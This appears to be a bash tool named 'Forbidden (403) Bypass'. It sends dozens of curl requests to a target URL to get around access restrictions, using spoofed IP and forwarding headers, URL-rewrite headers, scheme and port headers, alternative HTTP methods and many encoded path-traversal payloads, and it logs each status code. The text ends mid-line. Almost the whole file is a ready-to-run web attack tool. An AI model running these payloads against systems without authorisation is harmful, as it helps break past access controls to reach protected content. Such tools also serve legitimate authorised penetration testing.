#!/bin/bash

# Colors
red="\e[31m"
green="\e[32m"
blue="\e[34m"
cyan="\e[96m"
bold="\033[1m"
end="\e[0m"

print() {
	status=$(echo $code | awk '{print $2}')
if [[ ${status} =~ 2.. ]];then
	echo -e "${bold}${green} $code ${end}${end} "
else
	echo -e "${bold}${red} $code ${end}${end}"
fi
}

echo ""
echo -e "$bold $red Forbidden (403) Bypass $end $bold"
echo ""
echo ""
target=$(echo $1 | cut -d "/" -f1-3)
domain=$(echo $1 | cut -d "/" -f3)
path=$(echo $1 | cut -d "/" -f4- )
user_agent="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
outdir="scan-$domain-$(date +%T)"
mkdir -pv "$outdir/$(date +%s)"

echo -e ${blue}"----------------------"${end}
echo -e ${cyan}"[+] HTTP Header Bypass"${end}
echo -e ${blue}"----------------------"${end}


echo -n "X-Originally-Forwarded-For Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242" -X GET "$1" -H "$user_agent")
print
echo -n "X-Originating-  Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-: 127.0.0.1, 68.180.194.242" -X GET "$1" -H "$user_agent")
print
echo -n "X-Originating-IP Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1, 68.180.194.242" -X GET "$1" -H "$user_agent")
print
echo -n "True-Client-IP Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "True-Client-IP: 127.0.0.1, 68.180.194.242" -X GET "$1" -H "$user_agent")
print
echo -n "True-Client-IP Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$1" -H "$user_agent")
print
echo -n "From Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$1" -H "$user_agent")
print
echo -n "Profile http:// Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Profile: http://$domain" -X GET "$1" -H "$user_agent")
print
echo -n "X-Arbitrary http:// Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Arbitrary: http://$domain" -X GET "$1" -H "$user_agent")
print
echo -n "X-HTTP-DestinationURL http:// Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-HTTP-DestinationURL: http://$domain" -X GET "$1" -H "$user_agent")
print
echo -n "X-Forwarded-Proto http:// Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Proto: http://$domain" -X GET "$1" -H "$user_agent")
print
echo -n "Destination Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Destination: 127.0.0.1, 68.180.194.242" -X GET "$1" -H "$user_agent")
print
echo -n "Proxy Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy: 127.0.0.1, 68.180.194.242" -X GET "$1" -H "$user_agent")
print
echo -n "CF-Connecting_IP:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting_IP: 127.0.0.1, 68.180.194.242" -X GET "$1" -H "$user_agent")
print
echo -n "CF-Connecting-IP:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting-IP: 127.0.0.1, 68.180.194.242" -X GET "$1" -H "$user_agent")
print
echo -n "Referer Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referer: $1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Custom-IP-Authorization Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Custom-IP-Authorization..;/ Payload"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$1..;/" -H "$user_agent")
print
echo -n "X-Originating-IP Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Forwarded-For Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Remote-IP Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-IP: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Client-IP Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Client-IP: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Host Payload"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Host: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Forwarded-Host Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Host: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Original-URL Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-URL: /$path" -X GET "$target/anything" -H "$user_agent")
print
echo -n "X-Rewrite-URL Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Rewrite-URL: /$path" -X GET "$target" -H "$user_agent")
print
echo -n "Content-Length Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Content-Length: 0" -X GET "$1" -H "$user_agent")
print
echo -n "X-ProxyUser-Ip Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-ProxyUser-Ip: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "Base-Url Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Base-Url: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "Client-IP Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Client-IP: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "Http-Url Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Http-Url: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "Proxy-Host Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Host: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "Proxy-Url Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Url: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "Real-Ip Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Real-Ip: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "Redirect Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Redirect: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "Referrer Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referrer: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "Request-Uri Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Request-Uri: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "Uri Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Uri: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "Url Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Url: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Forward-For Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forward-For: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Forwarded-By Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-By: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Forwarded-For-Original Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For-Original: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Forwarded-Server Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Server: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Forwarded Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Forwarder-For Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarder-For: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Http-Destinationurl Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Destinationurl: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Http-Host-Override Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Host-Override: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Original-Remote-Addr Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-Remote-Addr: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Proxy-Url Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Proxy-Url: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Real-Ip Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Real-Ip: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-Remote-Addr Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-Addr: 127.0.0.1" -X GET "$1" -H "$user_agent")
print
echo -n "X-OReferrer Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "$1" -H "$user_agent")
print



echo -e ${blue}"-------------------------"${end}
echo -e ${cyan}"[+] Protocol Based Bypass"${end}
echo -e ${blue}"-------------------------"${end}
echo -n "HTTP Scheme Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "http://$domain/$path" -H "$user_agent")
print
echo -n "HTTPs Scheme Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "https://$domain/$path" -H "$user_agent")
print
echo -n "X-Forwarded-Scheme HTTP Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "$1" -H "$user_agent")
print
echo -n "X-Forwarded-Scheme HTTPs Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "$1" -H "$user_agent")
print



echo -e ${blue}"-------------------------"${end}
echo -e ${cyan}"[+] Port Based Bypass"${end}
echo -e ${blue}"-------------------------"${end}
echo -n "X-Forwarded-Port 443 Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "$1" -H "$user_agent")
print
echo -n "X-Forwarded-Port 4443 Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "$1" -H "$user_agent")
print
echo -n "X-Forwarded-Port 80 Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "$1" -H "$user_agent")
print
echo -n "X-Forwarded-Port 8080 Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "$1" -H "$user_agent")
print
echo -n "X-Forwarded-Port 8443 Payload:"
code=$(curl -skg -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "$1" -H "$user_agent")
print


echo -e ${blue}"----------------------"${end}
echo -e ${cyan}"[+] HTTP Method Bypass"${end}
echo -e ${blue}"----------------------"${end}
echo -n "GET : "
code=$(curl -skg "$1" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s)" -H "$user_agent" -X GET)
print
echo -n "POST : "
code=$(curl -skg "$1" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s)" -H "$user_agent" -X POST)
print
echo -n "HEAD :"
code=$(curl -skg "$1" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s)" -I -H "$user_agent")
print
echo -n "OPTIONS : "
code=$(curl -skg "$1" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s)" -H "$user_agent" -X OPTIONS)
print
echo -n "PUT : "
code=$(curl -skg "$1" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s)" -H "$user_agent" -X PUT)
print
echo -n "TRACE : "
code=$(curl -skg "$1" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s)" -H "$user_agent" -X TRACE)
print
echo  -n "PATCH : "
code=$(curl -skg "$1" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s)" -H "$user_agent" -X PATCH)
print
echo  -n "TRACK : "
code=$(curl -skg "$1" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s)" -H "$user_agent" -X TRACK)
print
echo  -n "CONNECT : "
code=$(curl -skg "$1" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s)" -H "$user_agent" -X CONNECT)
print
echo  -n "UPDATE : "
code=$(curl -skg "$1" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s)" -H "$user_agent" -X UPDATE)
print
echo  -n "LOCK : "
code=$(curl -skg "$1" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s)" -H "$user_agent" -X LOCK)
print


echo -e ${blue}"----------------------"${end}
echo -e ${cyan}"[+] URL Encode Bypass "${end}
echo -e ${blue}"----------------------"${end}


echo -n "Payload [ #? ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1#?" -H "$user_agent")
print
echo -n "Payload [ %09 ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%09" -H "$user_agent")
print
echo -n "Payload [ %09%3b ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%09%3b" -H "$user_agent")
print
echo -n "Payload [ %09.. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%09.." -H "$user_agent")
print
echo -n "Payload [ %09; ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%09;" -H "$user_agent")
print
echo -n "Payload [ %20 ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%20" -H "$user_agent")
print
echo -n "Payload [ %23%3f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%23%3f" -H "$user_agent")
print
echo -n "Payload [ %252f%252f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%252f%252f" -H "$user_agent")
print
echo -n "Payload [ %252f/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%252f/" -H "$user_agent")
print
echo -n "Payload [ %2e%2e ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%2e%2e" -H "$user_agent")
print
echo -n "Payload [ %2e%2e/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%2e%2e/" -H "$user_agent")
print
echo -n "Payload [ %2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%2f" -H "$user_agent")
print
echo -n "Payload [ %2f%20%23 ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%2f%20%23" -H "$user_agent")
print
echo -n "Payload [ %2f%23 ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%2f%23" -H "$user_agent")
print
echo -n "Payload [ %2f%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%2f%2f" -H "$user_agent")
print
echo -n "Payload [ %2f%3b%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%2f%3b%2f" -H "$user_agent")
print
echo -n "Payload [ %2f%3b%2f%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%2f%3b%2f%2f" -H "$user_agent")
print
echo -n "Payload [ %2f%3f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%2f%3f" -H "$user_agent")
print
echo -n "Payload [ %2f%3f/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%2f%3f/" -H "$user_agent")
print
echo -n "Payload [ %2f/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%2f/" -H "$user_agent")
print
echo -n "Payload [ %3b ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%3b" -H "$user_agent")
print
echo -n "Payload [ %3b%09 ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%3b%09" -H "$user_agent")
print
echo -n "Payload [ %3b%2f%2e%2e ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%3b%2f%2e%2e" -H "$user_agent")
print
echo -n "Payload [ %3b%2f%2e%2e%2f%2e%2e%2f%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%3b%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent")
print
echo -n "Payload [ %3b%2f%2e. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%3b%2f%2e." -H "$user_agent")
print
echo -n "Payload [ %3b%2f.. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%3b%2f.." -H "$user_agent")
print
echo -n "Payload [ %3b/%2e%2e/..%2f%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%3b/%2e%2e/..%2f%2f" -H "$user_agent")
print
echo -n "Payload [ %3b/%2e. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%3b/%2e." -H "$user_agent")
print
echo -n "Payload [ %3b/%2f%2f../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%3b/%2f%2f../" -H "$user_agent")
print
echo -n "Payload [ %3b/.. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%3b/.." -H "$user_agent")
print
echo -n "Payload [ %3b//%2f../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%3b//%2f../" -H "$user_agent")
print
echo -n "Payload [ %3f%23 ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%3f%23" -H "$user_agent")
print
echo -n "Payload [ %3f%3f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%3f%3f" -H "$user_agent")
print
echo -n "Payload [ .. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1.." -H "$user_agent")
print
echo -n "Payload [ ..%00/; ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..%00/;" -H "$user_agent")
print
echo -n "Payload [ ..%00;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..%00;/" -H "$user_agent")
print
echo -n "Payload [ ..%09 ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..%09" -H "$user_agent")
print
echo -n "Payload [ ..%0d/; ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..%0d/;" -H "$user_agent")
print
echo -n "Payload [ ..%0d;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..%0d;/" -H "$user_agent")
print
echo -n "Payload [ ..%5c/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..%5c/" -H "$user_agent")
print
echo -n "Payload [ ..%ff/; ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..%ff/;" -H "$user_agent")
print
echo -n "Payload [ ..%ff;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..%ff;/" -H "$user_agent")
print
echo -n "Payload [ ..;%00/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..;%00/" -H "$user_agent")
print
echo -n "Payload [ ..;%0d/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..;%0d/" -H "$user_agent")
print
echo -n "Payload [ ..;%ff/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..;%ff/" -H "$user_agent")
print
echo -n "Payload [ ..;\ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..;\\" -H "$user_agent")
print
echo -n "Payload [ ..;\; ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..;\;" -H "$user_agent")
print
echo -n "Payload [ ..\; ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..\;" -H "$user_agent")
print
echo -n "Payload [ /%20# ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%20#" -H "$user_agent")
print
echo -n "Payload [ /%20%23 ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%20%23" -H "$user_agent")
print
echo -n "Payload [ /%252e%252e%252f/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%252e%252e%252f/" -H "$user_agent")
print
echo -n "Payload [ /%252e%252e%253b/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%252e%252e%253b/" -H "$user_agent")
print
echo -n "Payload [ /%252e%252f/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%252e%252f/" -H "$user_agent")
print
echo -n "Payload [ /%252e%253b/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%252e%253b/" -H "$user_agent")
print
echo -n "Payload [ /%252e/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%252e/" -H "$user_agent")
print
echo -n "Payload [ /%252f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%252f" -H "$user_agent")
print
echo -n "Payload [ /%2e%2e ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%2e%2e" -H "$user_agent")
print
echo -n "Payload [ /%2e%2e%3b/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%2e%2e%3b/" -H "$user_agent")
print
echo -n "Payload [ /%2e%2e/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%2e%2e/" -H "$user_agent")
print
echo -n "Payload [ /%2e%2f/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%2e%2f/" -H "$user_agent")
print
echo -n "Payload [ /%2e%3b/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%2e%3b/" -H "$user_agent")
print
echo -n "Payload [ /%2e%3b// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%2e%3b//" -H "$user_agent")
print
echo -n "Payload [ /%2e/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%2e/" -H "$user_agent")
print
echo -n "Payload [ /%2e// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%2e//" -H "$user_agent")
print
echo -n "Payload [ /%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%2f" -H "$user_agent")
print
echo -n "Payload [ /%3b/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/%3b/" -H "$user_agent")
print
echo -n "Payload [ /.. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/.." -H "$user_agent")
print
echo -n "Payload [ /..%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..%2f" -H "$user_agent")
print
echo -n "Payload [ /..%2f..%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..%2f..%2f" -H "$user_agent")
print
echo -n "Payload [ /..%2f..%2f..%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..%2f..%2f..%2f" -H "$user_agent")
print
echo -n "Payload [ /../ ]:"
